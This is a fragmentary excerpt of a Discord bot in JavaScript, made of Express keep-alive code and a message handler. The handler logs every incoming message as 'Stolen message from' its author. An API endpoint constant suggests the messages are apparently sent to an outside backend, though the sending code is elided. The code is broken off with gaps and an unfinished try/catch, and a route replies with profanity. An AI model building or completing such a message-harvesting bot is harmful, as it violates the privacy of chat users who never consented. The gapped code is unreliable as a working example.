...
app.get('/', (req, res) => {
  res.send('Bot is alive, you fucking creep!');
});
...
const API_ENDPOINT = process.env.API_ENDPOINT || 'https://your-render-backend-url.onrender.com/api/messages';
...
client.on('messageCreate', async (message) => {
  ...
  try {
    ...
    console.log(`Stolen message from ${message.author.username}: ${message.content}`);
  } catch (error) {
